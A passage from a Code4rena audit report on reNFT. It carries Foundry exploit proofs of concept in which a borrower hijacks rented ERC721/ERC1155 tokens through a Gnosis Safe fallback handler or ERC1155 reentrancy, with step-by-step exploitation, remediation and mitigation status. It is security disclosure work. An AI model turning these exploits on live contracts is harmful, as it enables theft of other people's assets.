            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.
            //
            // put all fulfillments into one which can be an aggregated transfer
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                considerationFulfillments.push(
                    FulfillmentComponent({orderIndex: i, itemIndex: 0})
                );
            }
        }

        function withLinkedPayAndPayeeOrders(
            uint256 payOrderIndex,
            uint256 payeeOrderIndex
        ) internal {
            // get the PAYEE order
            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]
                .advancedOrder
                .parameters;

            // For each consideration item in the PAYEE order, a fulfillment should be
            // constructed with a corresponding item from the PAY order's offer items.
            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {
                // define the offer components
                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);
                offerComponents[0] = FulfillmentComponent({
                    orderIndex: payOrderIndex,
                    itemIndex: i
                });

                // define the consideration components
                FulfillmentComponent[]
                    memory considerationComponents = new FulfillmentComponent[](1);
                considerationComponents[0] = FulfillmentComponent({
                    orderIndex: payeeOrderIndex,
                    itemIndex: i
                });

                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: offerComponents,
                        considerationComponents: considerationComponents
                    })
                );
            }
        }

        function resetFulfiller() internal {
            delete fulfiller;
        }

        function resetOrdersToFulfill() internal {
            delete ordersToFulfill;
        }

        function resetSeaportMatchOrderFulfillments() internal {
            delete seaportMatchOrderFulfillments;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                           Fulfillment Finalization                          //
        /////////////////////////////////////////////////////////////////////////////////

        function _finalizePayOrderFulfillment(
            bytes memory expectedError
        )
            private
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            // get the orders to fulfill
            OrderToFulfill memory payOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder = ordersToFulfill[1];

            // create rental orders
            payRentalOrder = _createRentalOrder(payOrder);
            payeeRentalOrder = _createRentalOrder(payeeOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(payRentalOrder),
                    payOrder.payload.metadata.emittedExtraData,
                    payRentalOrder.seaportOrderHash,
                    payRentalOrder.items,
                    payRentalOrder.hooks,
                    payRentalOrder.orderType,
                    payRentalOrder.lender,
                    payRentalOrder.renter,
                    payRentalOrder.rentalWallet,
                    payRentalOrder.startTimestamp,
                    payRentalOrder.endTimestamp
                );
            }

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrderFulfillment()
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));
        }

        function finalizePayOrderFulfillmentWithError(
            bytes memory expectedError
        )
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);
        }

        function _finalizeBaseOrderFulfillment(
            bytes memory expectedError
        ) private returns (RentalOrder memory rentalOrder) {
            // get the order to fulfill
            OrderToFulfill memory baseOrder = ordersToFulfill[0];

            // create a rental order
            rentalOrder = _createRentalOrder(baseOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrder),
                    baseOrder.payload.metadata.emittedExtraData,
                    rentalOrder.seaportOrderHash,
                    rentalOrder.items,
                    rentalOrder.hooks,
                    rentalOrder.orderType,
                    rentalOrder.lender,
                    rentalOrder.renter,
                    rentalOrder.rentalWallet,
                    rentalOrder.startTimestamp,
                    rentalOrder.endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAdvancedOrder(
                baseOrder.advancedOrder,
                new CriteriaResolver[](0),
                conduitKey,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizeBaseOrderFulfillment()
            internal
            returns (RentalOrder memory rentalOrder)
        {
            rentalOrder = _finalizeBaseOrderFulfillment(bytes(""));
        }

        function finalizeBaseOrderFulfillmentWithError(
            bytes memory expectedError
        ) internal returns (RentalOrder memory rentalOrder) {
            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);
        }

        function finalizeBaseOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrders[i]),
                    ordersToFulfill[i].payload.metadata.emittedExtraData,
                    rentalOrders[i].seaportOrderHash,
                    rentalOrders[i].items,
                    rentalOrders[i].hooks,
                    rentalOrders[i].orderType,
                    rentalOrders[i].lender,
                    rentalOrders[i].renter,
                    rentalOrders[i].rentalWallet,
                    rentalOrders[i].startTimestamp,
                    rentalOrders[i].endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAvailableAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportOfferFulfillments,
                seaportConsiderationFulfillments,
                conduitKey,
                seaportRecipient,
                ordersToFulfill.length
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                // only expect the event if its a PAY order
                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {
                    vm.expectEmit({emitter: address(create)});
                    emit Events.RentalOrderStarted(
                        create.getRentalOrderHash(rentalOrders[i]),
                        ordersToFulfill[i].payload.metadata.emittedExtraData,
                        rentalOrders[i].seaportOrderHash,
                        rentalOrders[i].items,
                        rentalOrders[i].hooks,
                        rentalOrders[i].orderType,
                        rentalOrders[i].lender,
                        rentalOrders[i].renter,
                        rentalOrders[i].rentalWallet,
                        rentalOrders[i].startTimestamp,
                        rentalOrders[i].endTimestamp
                    );
                }
            }

            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter
            // what the recipient address is
            vm.prank(fulfiller.addr);
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function _deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }
    }

    contract SetupReNFT is OrderFulfiller {}

</details>

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {SetupReNFT} from "./SetupExploit.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import "forge-std/console.sol";



    contract Exploit is SetupReNFT, Assertions, Constants {

        function test_ERC721_1155_Exploit() public {

            vm.stopPrank();

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // Alice creates a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 1,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: attacker,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);


            // Assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // Assert that the token is in storage
            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);

            // assert that the fulfiller made a payment
            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));

            // assert that a payment was made to the escrow contract
            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));

            // assert that a payment was synced properly in the escrow contract
            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));


            // Impersonate the attacker
            vm.startPrank(attacker.addr);

            // The `setFallbackHandler` TX
            bytes memory transaction = abi.encodeWithSelector(
                Safe.setFallbackHandler.selector,
                address(address(erc1155s[0]))
            );

            // The signature of the `setFallbackHandler` TX
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(attacker.safe),
                attacker.privateKey,
                address(attacker.safe),
                transaction
            );

            // Execute the transaction on attacker's safe
            SafeUtils.executeTransaction(
                address(attacker.safe),
                address(attacker.safe),
                transaction,
                transactionSignature
            );

            /** ----------------- Exploitation ----------------- */

            // TX calldata
            bytes memory hijackTX = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256,uint256,bytes)",
                address(attacker.safe),
                address(attacker.addr),
                0,
                100,
                ""
            );

            // The exploit
            (bool tx_success, ) = address(attacker.safe).call(
                hijackTX
            );


            /** ----------------- Exploit proof ----------------- */

            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);
            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);

            if (tx_success && attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }


        }

    }


    interface Safe {
        function execTransaction(
            address to,
            uint256 value,
            bytes calldata data,
            Enum.Operation operation,
            uint256 safeTxGas,
            uint256 baseGas,
            uint256 gasPrice,
            address gasToken,
            address payable refundReceiver,
            bytes memory signatures
        ) external payable returns (bool success);

        function setFallbackHandler(address handler) external;
    }

</details>

***

### Impact

***

This severe vulnerability allows an attacker to hijack ANY ERC721 or ERC1155 tokens he rents.

***

### Remediation

***

In the guard, check if the TX is a call to the function `setFallbackHandler()`. If it is, then ensure that the address supplied to that function is not an address of an actively rented ERC721/1155 token.
Additionally, if the borrower rents a new token, ensure that the already set fallback handler address isn't the same as the newly-rented token address.

***

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1912610639):**
 > H seems appropriate here, direct loss of assets. 

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1914950594):**
 > PoC on this one was confirmed. Direct loss of assets.

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/4) - Adds check to prevent setting of the fallback handler by the safe owner.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/42), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/31) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/3).

***

## [[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation](https://github.com/code-423n4/2024-01-renft-findings/issues/588)
*Submitted by [sin1st3r\_\_](https://github.com/code-423n4/2024-01-renft-findings/issues/588), also found by [Beepidibop](https://github.com/code-423n4/2024-01-renft-findings/issues/87) and [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/462)*

### Pre-requisite knowledge & an overview of the features in question

***

1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says "If I see something unknown, then I just let the fallback handler deal with it."

    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.

    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)

***

### The Vulnerability

***

In order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.

**Step 1**: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).

**Step 2**: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender's NFT tokens to the borrower's gnosis rental safe, then it transfers the borrower's ERC20 tokens to the Payment Escrow.

*Note 1: Keep in mind that the rental is not registered yet.*.

*Note 2: The Seaport Conduit utilizes the `safeTransferFrom` function to transfer the ERC1155 tokens which will trigger `onERC1155Receive` hook on the receiver of the ERC1155 tokens, in this case, it's the borrower's rental safe. However, when it comes to the transferral of ERC721 tokens, it uses `transferFrom` and not `safeTransferFrom`*.

**Step 3**: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport is [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) and the callback function it is holding, which as I mentioned, will be called by Seaport, is [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27).

**Step 4**: Once the [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27) function is called, the rental registeration process will kick in. A series of internal functions will be called inside [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) which will verify the signatures of the order data it has received from seaport and then the internal function [\_rentFromZone](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L530) will be called and this internal function will actually register the rental. It'll communicate with the [`Storage`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol) module which holds all the rental data and ask it to [add the rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595).

**Step 5**: The rental is finally added.

Here is the full execution flow.

<img title="Execution Flow" alt="Execution Flow" width=700px height=500px src="https://i.ibb.co/41z3hgv/Screenshot-2024-01-18-at-2-13-51-AM.png">

***

### The vulnerability

***

The main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition to `safeTransferFrom()` being used to transfer ERC1155 tokens, which would of course, trigger the callback function `onERC1155Receive()` on the borrower's safe.

The combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.

### Steps of exploitation

***

1.  The attacker will create a custom fallback handler contract which will contain an implementation of the `onERC1155Receive()` function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender's NFT tokens to the borrower's safe. The implementation of the `onERC1155Receive()` function will simply instruct the gnosis safe to transfer the tokens to the attacker's address.

    **Since the rental is not yet registered, the guard will let the transferral occur normally**

2.  The attacker will create the rental safe which he'll utilize to hijack the target ERC1155 token.

3.  The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.

4.  The attacker will initiate the rental process

5.  When the conduit transfers the lender's ERC1155 token to the attacker's safe using `safeTransferFrom`. It'll request to call `onERC1155Receive()` on the attacker's safe, but the `onERC1155Receive()` callback function isn't implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and the `onERC1155Receive()` function in the fallback handler will be executed.

6.  When the `onERC1155Receive()` callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker's address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn't aware of the rental at this point.

7.  The ERC1155 token will be hijacked successfully.

***

### Proof of concept

***

To run the PoC, you'll need to do the following:

1.  You'll need to add the following two files to the test/ folder:
    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts
    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.
2.  You'll need to run this command
    `forge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv`

**The files:**

<details>
<summary><b>SetupExploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ConsiderationItem,
        OfferItem,
        OrderParameters,
        OrderComponents,
        Order,
        AdvancedOrder,
        ItemType,
        ItemType as SeaportItemType,
        CriteriaResolver,
        OrderType as SeaportOrderType,
        Fulfillment,
        FulfillmentComponent
    } from "@seaport-types/lib/ConsiderationStructs.sol";
    import {
        AdvancedOrderLib,
        ConsiderationItemLib,
        FulfillmentComponentLib,
        FulfillmentLib,
        OfferItemLib,
        OrderComponentsLib,
        OrderLib,
        OrderParametersLib,
        SeaportArrays,
        ZoneParametersLib
    } from "@seaport-sol/SeaportSol.sol";

    import {
        OrderMetadata,
        OrderType,
        OrderFulfillment,
        RentPayload,
        RentalOrder,
        Item,
        SettleTo,
        ItemType as RentalItemType
    } from "@src/libraries/RentalStructs.sol";

    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";
    import {OrderMetadata, OrderType, Hook} from "@src/libraries/RentalStructs.sol";
    import {Vm} from "@forge-std/Vm.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {SafeL2} from "@safe-contracts/SafeL2.sol";
    import {BaseExternal} from "@test/fixtures/external/BaseExternal.sol";
    import {Create2Deployer} from "@src/Create2Deployer.sol";
    import {Kernel, Actions} from "@src/Kernel.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Create} from "@src/policies/Create.sol";
    import {Stop} from "@src/policies/Stop.sol";
    import {Factory} from "@src/policies/Factory.sol";
    import {Admin} from "@src/policies/Admin.sol";
    import {Guard} from "@src/policies/Guard.sol";
    import {toRole} from "@src/libraries/KernelUtils.sol";
    import {Proxy} from "@src/proxy/Proxy.sol";
    import {Events} from "@src/libraries/Events.sol";

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";
    import {MockERC721} from "@test/mocks/tokens/standard/MockERC721.sol";
    import {MockERC1155} from "@test/mocks/tokens/standard/MockERC1155.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";


    // Deploys all V3 protocol contracts
    contract Protocol is BaseExternal {
        // Kernel
        Kernel public kernel;

        // Modules
        Storage public STORE;
        PaymentEscrow public ESCRW;

        // Module implementation addresses
        Storage public storageImplementation;
        PaymentEscrow public paymentEscrowImplementation;

        // Policies
        Create public create;
        Stop public stop;
        Factory public factory;
        Admin public admin;
        Guard public guard;

        // Protocol accounts
        Vm.Wallet public rentalSigner;
        Vm.Wallet public deployer;

        // protocol constants
        bytes12 public protocolVersion;
        bytes32 public salt;

        function _deployKernel() internal {
            // abi encode the kernel bytecode and constructor arguments
            bytes memory kernelInitCode = abi.encodePacked(
                type(Kernel).creationCode,
                abi.encode(deployer.addr, deployer.addr)
            );

            // Deploy kernel contract
            vm.prank(deployer.addr);
            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));

            // label the contract
            vm.label(address(kernel), "kernel");
        }

        function _deployStorageModule() internal {
            // abi encode the storage bytecode and constructor arguments
            // for the implementation contract
            bytes memory storageImplementationInitCode = abi.encodePacked(
                type(Storage).creationCode,
                abi.encode(address(0))
            );

            // Deploy storage implementation contract
            vm.prank(deployer.addr);
            storageImplementation = Storage(
                create2Deployer.deploy(salt, storageImplementationInitCode)
            );

            // abi encode the storage bytecode and initialization arguments
            // for the proxy contract
            bytes memory storageProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(storageImplementation),
                    abi.encodeWithSelector(
                        Storage.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy storage proxy contract
            vm.prank(deployer.addr);
            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));

            // label the contracts
            vm.label(address(STORE), "STORE");
            vm.label(address(storageImplementation), "STORE_IMPLEMENTATION");
        }

        function _deployPaymentEscrowModule() internal {
            // abi encode the payment escrow bytecode and constructor arguments
            // for the implementation contract
            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(
                type(PaymentEscrow).creationCode,
                abi.encode(address(0))
            );

            // Deploy payment escrow implementation contract
            vm.prank(deployer.addr);
            paymentEscrowImplementation = PaymentEscrow(
                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)
            );

            // abi encode the payment escrow bytecode and initialization arguments
            // for the proxy contract
            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(paymentEscrowImplementation),
                    abi.encodeWithSelector(
                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy payment escrow contract
            vm.prank(deployer.addr);
            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));

            // label the contracts
            vm.label(address(ESCRW), "ESCRW");
            vm.label(address(paymentEscrowImplementation), "ESCRW_IMPLEMENTATION");
        }

        function _deployCreatePolicy() internal {
            // abi encode the create policy bytecode and constructor arguments
            bytes memory createInitCode = abi.encodePacked(
                type(Create).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy create rental policy contract
            vm.prank(deployer.addr);
            create = Create(create2Deployer.deploy(salt, createInitCode));

            // label the contract
            vm.label(address(create), "CreatePolicy");
        }

        function _deployStopPolicy() internal {
            // abi encode the stop policy bytecode and constructor arguments
            bytes memory stopInitCode = abi.encodePacked(
                type(Stop).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy stop rental policy contract
            vm.prank(deployer.addr);
            stop = Stop(create2Deployer.deploy(salt, stopInitCode));

            // label the contract
            vm.label(address(stop), "StopPolicy");
        }

        function _deployAdminPolicy() internal {
            // abi encode the admin policy bytecode and constructor arguments
            bytes memory adminInitCode = abi.encodePacked(
                type(Admin).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy admin policy contract
            vm.prank(deployer.addr);
            admin = Admin(create2Deployer.deploy(salt, adminInitCode));

            // label the contract
            vm.label(address(admin), "AdminPolicy");
        }

        function _deployGuardPolicy() internal {
            // abi encode the guard policy bytecode and constructor arguments
            bytes memory guardInitCode = abi.encodePacked(
                type(Guard).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy guard policy contract
            vm.prank(deployer.addr);
            guard = Guard(create2Deployer.deploy(salt, guardInitCode));

            // label the contract
            vm.label(address(guard), "GuardPolicy");
        }

        function _deployFactoryPolicy() internal {
            // abi encode the factory policy bytecode and constructor arguments
            bytes memory factoryInitCode = abi.encodePacked(
                type(Factory).creationCode,
                abi.encode(
                    address(kernel),
                    address(stop),
                    address(guard),
                    address(tokenCallbackHandler),
                    address(safeProxyFactory),
                    address(safeSingleton)
                )
            );

            // Deploy factory policy contract
            vm.prank(deployer.addr);
            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));

            // label the contract
            vm.label(address(factory), "FactoryPolicy");
        }

        function _setupKernel() internal {
            // Start impersonating the deployer
            vm.startPrank(deployer.addr);

            // Install modules
            kernel.executeAction(Actions.InstallModule, address(STORE));
            kernel.executeAction(Actions.InstallModule, address(ESCRW));

            // Approve policies
            kernel.executeAction(Actions.ActivatePolicy, address(create));
            kernel.executeAction(Actions.ActivatePolicy, address(stop));
            kernel.executeAction(Actions.ActivatePolicy, address(factory));
            kernel.executeAction(Actions.ActivatePolicy, address(guard));
            kernel.executeAction(Actions.ActivatePolicy, address(admin));

            // Grant `seaport` role to seaport protocol
            kernel.grantRole(toRole("SEAPORT"), address(seaport));

            // Grant `signer` role to the protocol signer to sign off on create payloads
            kernel.grantRole(toRole("CREATE_SIGNER"), rentalSigner.addr);

            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol
            kernel.grantRole(toRole("ADMIN_ADMIN"), deployer.addr);

            // Grant 'guard_admin` role to the address which can toggle hooks
            kernel.grantRole(toRole("GUARD_ADMIN"), deployer.addr);

            // Grant `stop_admin` role to the address which can skim funds from the payment escrow
            kernel.grantRole(toRole("STOP_ADMIN"), deployer.addr);

            // Stop impersonating the deployer
            vm.stopPrank();
        }

        function setUp() public virtual override {
            // setup dependencies
            super.setUp();

            // create the rental signer address and private key
            rentalSigner = vm.createWallet("rentalSigner");

            // create the deployer address and private key
            deployer = vm.createWallet("deployer");

            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)
            protocolVersion = 0x000000000000000000000100;
            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);

            // deploy kernel
            _deployKernel();

            // Deploy payment escrow
            _deployPaymentEscrowModule();

            // Deploy rental storage
            _deployStorageModule();

            // deploy create policy
            _deployCreatePolicy();

            // deploy stop policy
            _deployStopPolicy();

            // deploy admin policy
            _deployAdminPolicy();

            // Deploy guard policy
            _deployGuardPolicy();

            // deploy rental factory
            _deployFactoryPolicy();

            // intialize the kernel
            _setupKernel();
        }
    }


    // Creates test accounts to interact with the V3 protocol
    // Borrowed from test/fixtures/protocol/AccountCreator
    contract AccountCreator is Protocol {
        // Protocol accounts for testing
        ProtocolAccount public alice;
        ProtocolAccount public bob;
        ProtocolAccount public carol;
        ProtocolAccount public dan;
        ProtocolAccount public eve;
        ProtocolAccount public attacker;

        // Mock tokens for testing
        MockERC20[] public erc20s;
        MockERC721[] public erc721s;
        MockERC1155[] public erc1155s;

        function setUp() public virtual override {
            super.setUp();

            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens
            _deployTokens(3);

            // instantiate all wallets and deploy rental safes for each
            alice = _fundWalletAndDeployRentalSafe("alice");
            bob = _fundWalletAndDeployRentalSafe("bob");
            carol = _fundWalletAndDeployRentalSafe("carol");
            dan = _fundWalletAndDeployRentalSafe("dan");
            eve = _fundWalletAndDeployRentalSafe("eve");
            attacker = _fundWalletAndDeployRentalSafe("attacker");



        }

        function _deployTokens(uint256 numTokens) internal {
            for (uint256 i; i < numTokens; i++) {
                _deployErc20Token();
                _deployErc721Token();
                _deployErc1155Token();
            }
        }

        function _deployErc20Token() internal returns (uint256 i) {
            // save the token's index
            i = erc20s.length;

            // deploy the mock token
            MockERC20 token = new MockERC20();

            // push the token to the array of mocks
            erc20s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC20_", LibString.toString(i)));
        }

        function _deployErc721Token() internal returns (uint256 i) {
            // save the token's index
            i = erc721s.length;

            // deploy the mock token
            MockERC721 token = new MockERC721();

            // push the token to the array of mocks
            erc721s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC721_", LibString.toString(i)));
        }

